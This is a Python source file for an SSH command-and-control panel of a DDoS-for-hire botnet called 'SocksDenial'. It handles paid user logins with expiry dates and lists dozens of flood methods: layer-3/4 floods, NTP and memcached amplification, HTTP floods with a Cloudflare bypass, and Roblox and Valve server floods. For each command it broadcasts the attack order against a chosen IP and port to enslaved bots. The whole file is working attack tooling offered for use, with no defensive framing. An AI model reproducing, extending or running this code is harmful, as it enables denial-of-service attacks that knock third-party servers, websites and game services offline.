import socket, threading, paramiko, os as _os, time, io, json
from datetime import datetime
from colorama import Fore
from rich.console import Console
from rich.text import Text

from src.Commands.Tools.url_to_ip import url_to_ip
from src.Commands.Tools.ip_to_loc import ip_to_loc
from src.Commands.Methods_L3.icmp import icmp
from src.Commands.Methods_L3.pod import pod
from src.Commands.Methods_L4.junk import junk
from src.Commands.Methods_L4.tcp import tcp
from src.Commands.Methods_L4.udp import udp
from src.Commands.Methods_L4.hex import hex
from src.Commands.Methods_L4.tup import tup
from src.Commands.Methods_L4.syn import syn
from src.Commands.Methods_L4.ntp import ntp
from src.Commands.Methods_L4.mem import mem
from src.Commands.Methods_L7.httpio import httpio
from src.Commands.Methods_L7.httpspoof import httpspoof
from src.Commands.Methods_L7.httpstorm import httpstorm
from src.Commands.Methods_L7.httpcfb import httpcfb
from src.Commands.Methods_L7.httpget import httpget
from src.Commands.Methods_Games.roblox import roblox
from src.Commands.Methods_Games.vse import vse
from src.cnc import bots, broadcast, validate_ip, validate_port, validate_time, validate_size
from src.history import log_attack, get_history, is_admin_user

_DIR = _os.path.dirname(_os.path.abspath(__file__))
try:
    with open(_os.path.join(_DIR, "config.json"), encoding="utf-8") as _f:
        _cfg = json.load(_f)
    _HOST = _cfg.get("cnc_host", "0.0.0.0")
    _PORT = int(_cfg.get("ssh_port", 5514))
except:
    _HOST, _PORT = "0.0.0.0", 5514
_KEY = paramiko.RSAKey.generate(2048)

B2_RAW = ('         .-. \\_/ .-.\n'
          '         \\.-\\/=\\/.-.\n'
          "      '-./___|=|___\\.-'\n"
          '     .--| \\|/`"`\\|/ |--.\n'
          '    (((_)\\  .---.  /(_)))\n'
          "     ` \\ \\_`-.   .-'_/ /`_\n"
          "       '.__       __.'(_))\n"
          '           /     \\     //    ~ SocksDenial\n'
          "          |       |__.'/\n"
          '          \\       /--\'`\n'
          "      .--,-' .--. '----.\n"
          "     '----`--'  '--`----'\n"
          "Type 'help' for list of commands")

B1_RAW = ('  mmmm                #\n'
          ' #"   "  mmm    mmm   #   m   mmm    mmm    mmm\n'
          ' "#mmm  #" "#  #"  "  # m"   #   "  #   "  #   "\n'
          '     "# #   #  #      #"#     """m   """m   """m\n'
          ' "mmm#" "#m#"  "#mm"  #  "m  "mmm"  "mmm"  "mmm"')


class ChanConsole:
    def __init__(self, chan, width=80):
        self.chan = chan
        self.buf = io.StringIO()
        self.con = Console(file=self.buf, force_terminal=True, color_system='truecolor', width=width, highlight=False)

    def out(self, *args, **kwargs):
        self.con.print(*args, **kwargs)
        text = self.buf.getvalue()
        self.buf.truncate(0)
        self.buf.seek(0)
        text = text.replace('\n', '\r\n')
        try: self.chan.send(text.encode('utf-8'))
        except: pass

    def send(self, client, data, escape=True, reset=True):
        if reset:
            data += Fore.RESET
        if escape:
            data += '\r\n'
        try:
            self.chan.send(data.encode('utf-8'))
        except:
            pass


def get_input(chan):
    b = b""
    while True:
        try:
            c = chan.recv(1)
            if not c: return None
            ch = c.decode('utf-8', errors='replace')
        except: return None
        if ch in ('\r', '\n'):
            chan.send(b'\r\n')
            return b.decode('utf-8', errors='replace').strip()
        if ch in ('\x7f', '\x08'):
            if b: b = b[:-1]; chan.send(b'\b \b')
            continue
        if ord(ch) < 32: continue
        chan.send(c)
        b += c


class Shell(paramiko.ServerInterface):
    def __init__(self):
        self.e = threading.Event()
    def check_channel_request(self, k, i):
        return paramiko.OPEN_SUCCEEDED if k == "session" else paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, u, p):
        from src.history import parse_login_line
        try:
            for l in open(_os.path.join(_DIR, "logins.txt")):
                uname, pwd, exp, _ = parse_login_line(l)
                if uname and uname.lower() == u.lower() and pwd == p:
                    if exp:
                        try:
                            if datetime.now() > datetime.strptime(exp, "%Y-%m-%d"):
                                return paramiko.AUTH_FAILED
                        except: pass
                    return paramiko.AUTH_SUCCESSFUL
        except: pass
        return paramiko.AUTH_FAILED
    def get_allowed_auths(self, u): return "password"
    def check_channel_shell_request(self, c): self.e.set(); return True
    def check_channel_pty_request(self, c, t, w, h, pw, ph, m): return True


_g = "[bright_black]"
_w = "[bright_white]"
_pw = "[white]"

HELP_C = f"""{_g}List of commands:
{_w}HELP         {_g}Shows list of commands   
{_w}BOTNET       {_g}Shows list of botnet methods
{_w}METHODS      {_g}Shows Methods List
{_w}BOTS         {_g}Shows available zombies
{_w}TOOLS        {_g}Shows list of tools    
{_w}CLEAR        {_g}Clears the screen          
{_w}EXIT         {_g}Disconnects from the net"""

METH_C = f"""{_g}List of Methods:
{_w}L3               {_g}Show all L3 Methods
{_w}L4               {_g}Show all L4 Methods  
{_w}AMP              {_g}Show all Amplification Methods  
{_w}HTTP             {_g}Show all L7 Methods  
{_w}GAMES            {_g}Show all Games Methods
{_w}BOTNET           {_g}Show all Methods"""

L3_C = f"""{_g}L3 Methods:
{_w}.ICMP              {_g}Flood ICMP Request
{_w}.POD               {_g}Ping Of Death OLD Method Of DDoS"""

L4_C = f"""{_g}L4 Methods:
{_w}.UDP               {_g}UDP Flood  
{_w}.UDP-PLAIN         {_g}UDP Plain Flood
{_w}.UDP-PPS           {_g}DNS UDP Flood
{_w}.UDP-GIGS          {_g}UDP High Bandwidth
{_w}.PPS-HAMMER        {_g}UDP PPS Hammer (Burst)
{_w}.TCP               {_g}TCP Flood             
{_w}.TUP               {_g}TCP and UDP Flood
{_w}.SYN               {_g}TCP SYN flood
{_w}.SYNFLOOD          {_g}TCP SYN Raw Flood
{_w}.HEX               {_g}HEX Flood
{_w}.STDHEX            {_g}STD Hex Flood
{_w}.STD               {_g}STD Flood
{_w}.JUNK              {_g}Junk flood
{_w}.XMAS              {_g}XMAS TCP Flood
{_w}.RST               {_g}TCP RST Flood
{_w}.NFODROP           {_g}NFO Drop Flood
{_w}.OVHKILL           {_g}OVH Kill Flood"""

L7_C = f"""{_g}L7 Methods:
{_w}.HTTPIO            {_g}HTTP IO Stresser
{_w}.HTTPCFB           {_g}HTTP Cloudflare bypass     
{_w}.HTTPGET           {_g}HTTP GET requests 
{_w}.HTTPSPOOF         {_g}HTTP GET Spoofing
{_w}.HTTPSTORM         {_g}HTTP STORM Requests
{_w}.HTTP2-RAW         {_g}HTTP/1.1 Raw Flood"""

AMP_C = f"""{_g}Amplification Methods:
{_w}.NTP               {_g}NTP Reflection flood
{_w}.MEM               {_g}Memcached Flood"""

GAMES_C = f"""{_g}Games Methods: 
{_w}.VSE               {_g}Valve Source Engine query flood         
{_w}.ROBLOX            {_g}Roblox UDP Flood"""

TOOLS_C = f"""{_g}List of Tools:
{_w}!GETIP         {_g}Get ip from URL      
{_w}!GEOIP         {_g}Get info from ip"""

ADMIN_C = f"""{_g}Admin Commands:
{_w}!USER               {_g}Add/List/remove users"""

BOTNET_C = "\n".join([L3_C, L4_C, AMP_C, L7_C, GAMES_C])


def _get_user_expiry(user):
    try:
        for line in open(_os.path.join(_DIR, "logins.txt")):
            uname, _, exp, _ = parse_login_line(line)
            if uname and uname.lower() == user.lower():
                return exp or "never"
    except: pass
    return "unknown"

def _title_updater(chan, user):
    expiry = _get_user_expiry(user)
    while True:
        try:
            n = len(bots)
            chan.send(f"\033]0;SocksDenial | User: {user} | Bots: {n} | Expires: {expiry}\a".encode())
            time.sleep(1)
        except:
            break

def proc(chan, user):
    cc = ChanConsole(chan)
    is_admin = is_admin_user(user)

    chan.send(b'\033[2J\033[H')
    cc.out(Text(B2_RAW, style="bright_white"))
    cc.out()

    t = threading.Thread(target=_title_updater, args=(chan, user), daemon=True)
    t.start()

    while True:
        cc.out(f'{_g}({_pw}Websocks{_g}@[bright_red]{user}{_g}) $~ {_g}', end='')

        inp = get_input(chan)
        if inp is None: break
        if not inp: continue

        args = inp.split()
        cmd = args[0].upper()
        is_clear = cmd in ('CLS', 'CLEAR')

        chan.send(b'\033[2J\033[H')
        cc.out(Text(B2_RAW if is_clear else B1_RAW, style="bright_white"))
        if is_clear:
            cc.out()
        else:
            cc.out("\n\n")

        if cmd in ('HELP', '?'):
            cc.out(HELP_C)
        elif cmd == 'BOTNET':
            cc.out(BOTNET_C)
        elif cmd == 'METHODS':
            cc.out(METH_C)
        elif cmd == 'L3':
            cc.out(L3_C)
        elif cmd == 'L4':
            cc.out(L4_C)
        elif cmd in ('L7', 'HTTP'):
            cc.out(L7_C)
        elif cmd in ('AMP', 'AMPLIFICATION'):
            cc.out(AMP_C)
        elif cmd == 'GAMES':
            cc.out(GAMES_C)
        elif cmd == 'TOOLS':
            cc.out(TOOLS_C)
        elif cmd in ('CLS', 'CLEAR'):
            pass
        elif cmd in ('EXIT', 'LOGOUT'):
            break
        elif cmd == 'BOTS':
            bc = len(bots)
            cc.out(f"{_g}Bots online: {bc}")
            for bi, info in list(bots.items())[:50]:
                try:
                    a = info[0]
                    if isinstance(a, tuple): a = a[0]
                    cc.out(f"  {info[1]}  {a}  {info[2]}")
                except: pass
        elif cmd == 'HISTORY':
            rows = get_history(user if not is_admin else None, is_admin, 50)
            if not rows:
                cc.out(f"{_w}No history found.")
            else:
                cc.out(f"{_w}{'Time':19s} | {'User':15s} | Command")
                cc.out(_g + "-"*60)
                for r in rows:
                    cc.out(f"{r['time']:19s} | {r['user']:15s} | {r['command']}")
        elif cmd == '!ADMIN' and user == "root":
            cc.out(ADMIN_C)
        elif cmd in ('!USER', '!U') and user == "root":
            try:
                ch = args[1].upper()
                if ch in ('ADD','A') and len(args)==5:
                    with open(_os.path.join(_DIR,"logins.txt"),'a') as f: f.write(f'\n{args[2]}:{args[3]}:{args[4]}')
                    cc.out(f"{_w}User added.")
                elif ch in ('REMOVE','R') and len(args)==3:
                    with open(_os.path.join(_DIR,"logins.txt"),'r') as f: ls=f.readlines()
                    with open(_os.path.join(_DIR,"logins.txt"),'w') as f:
                        for lx in ls:
                            if args[2] not in lx: f.write(lx)
                    cc.out(f"{_w}User removed.")
                elif ch in ('LIST','L'):
                    for lx in open(_os.path.join(_DIR,"logins.txt")):
                        if lx.strip():
                            p=lx.strip().split(':')
                            cc.out(f"{p[0]}:{p[1]} (exp: {p[2]})")
            except: cc.out(f"{_w}!USER ADD/LIST/REMOVE")
        elif cmd in ("!GEOIP","!IP_TO_LOCATION","!IP_GEO","!IP_GEOLOCATION","!IP_GEOLOCAT"):
            ip_to_loc(args, cc.send, chan, "")
        elif cmd == "!GETIP":
            url_to_ip(args, cc.send, chan, "")
        elif cmd == '.UDP':
            udp(args, validate_ip, validate_port, validate_time, validate_size, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.TUP':
            tup(args, validate_ip, validate_port, validate_time, validate_size, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.SYN':
            syn(args, validate_ip, validate_port, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.TCP':
            tcp(args, validate_ip, validate_port, validate_time, validate_size, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.HEX':
            hex(args, validate_ip, validate_port, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.NTP':
            ntp(args, validate_ip, validate_port, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.MEM':
            mem(args, validate_ip, validate_port, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.ICMP':
            icmp(args, validate_ip, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.POD':
            pod(args, validate_ip, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.ROBLOX':
            roblox(args, validate_ip, validate_port, validate_time, validate_size, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.JUNK':
            junk(args, validate_ip, validate_port, validate_time, validate_size, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.VSE':
            vse(args, validate_ip, validate_port, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.HTTPSTORM':
            httpstorm(args, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.HTTPIO':
            httpio(args, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.HTTPSPOOF':
            httpspoof(args, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.HTTPGET':
            httpget(args, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.HTTPCFB':
            httpcfb(args, validate_time, cc.send, chan, "\033[2J\033[H", broadcast, inp); log_attack(user, inp)
        elif cmd == '.UDP-PLAIN':
            if len(args)==5:
                ip,p,secs,th=args[1],args[2],args[3],args[4]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.UDP-PLAIN {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .UDP-PLAIN [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.UDP-PPS':
            if len(args)==4:
                ip,secs,th=args[1],args[2],args[3]
                if validate_ip(ip) and validate_time(secs):
                    broadcast(f'.UDP-PPS {ip} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .UDP-PPS [IP] [TIME] [THREADS]")
        elif cmd == '.UDP-GIGS':
            if len(args)==5:
                ip,p,secs,th=args[1],args[2],args[3],args[4]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.UDP-GIGS {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .UDP-GIGS [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.PPS-HAMMER':
            if len(args)>=4:
                ip,p,secs=args[1],args[2],args[3]
                th=args[4] if len(args)>=5 else 500
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.PPS-HAMMER {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .PPS-HAMMER [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.HTTP2-RAW':
            if len(args)==4:
                url,secs,th=args[1],args[2],args[3]
                if validate_time(secs):
                    broadcast(f'.HTTP2-RAW {url} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid time")
            else: cc.out(f"{_w}Usage: .HTTP2-RAW [URL] [TIME] [THREADS]")
        elif cmd == '.STDHEX':
            if len(args)==5:
                ip,p,secs,th=args[1],args[2],args[3],args[4]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.STDHEX {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .STDHEX [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.STD':
            if len(args)==5:
                ip,p,secs,th=args[1],args[2],args[3],args[4]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.STD {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .STD [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.NFODROP':
            if len(args)==5:
                ip,p,secs,th=args[1],args[2],args[3],args[4]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.NFODROP {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .NFODROP [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.OVHKILL':
            if len(args)==5:
                ip,p,secs,th=args[1],args[2],args[3],args[4]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.OVHKILL {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .OVHKILL [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.XMAS':
            if len(args)==6:
                ip,p,secs,spf,ps=args[1],args[2],args[3],args[4],args[5]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.XMAS {ip} {p} {secs} {spf} {ps}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .XMAS [IP] [PORT] [TIME] [SPOOFIT] [SIZE]")
        elif cmd == '.SYNFLOOD':
            if len(args)==5:
                ip,p,secs,th=args[1],args[2],args[3],args[4]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.SYNFLOOD {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .SYNFLOOD [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.RST':
            if len(args)==5:
                ip,p,secs,th=args[1],args[2],args[3],args[4]
                if validate_ip(ip) and validate_port(p) and validate_time(secs):
                    broadcast(f'.RST {ip} {p} {secs} {th}')
                    cc.out("[green]Attack sent!"); log_attack(user, inp)
                else: cc.out("[red]Invalid args")
            else: cc.out(f"{_w}Usage: .RST [IP] [PORT] [TIME] [THREADS]")
        elif cmd == '.STOP-ALL':
            broadcast('.STOP-ALL')
            cc.out("[yellow]Stopping all attacks!"); log_attack(user, inp)
        if cmd not in ('CLS', 'CLEAR'):
            cc.out()

    try: chan.close()
    except: pass


def hs(cs, a):
    t = paramiko.Transport(cs)
    t.add_server_key(_KEY)
    s = Shell()
    t.start_server(server=s)
    ch = t.accept(20)
    if not ch: t.close(); return
    s.e.wait()
    try: proc(ch, t.get_username())
    except: pass
    try: ch.close()
    except: pass
    t.close()


def start(host=_HOST, port=_PORT, bots_ref=None, broadcast_ref=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(50)

    def _accept():
        while 1:
            try:
                c, a = sock.accept()
                threading.Thread(target=hs, args=(c, a), daemon=True).start()
            except: break

    t = threading.Thread(target=_accept, daemon=True)
    t.start()
    return sock, t


if __name__ == "__main__":
    s, _ = start()
    print("[SSH-CNC] %s:%d" % (_HOST, _PORT))
    try: threading.Event().wait()
    except KeyboardInterrupt: s.close()
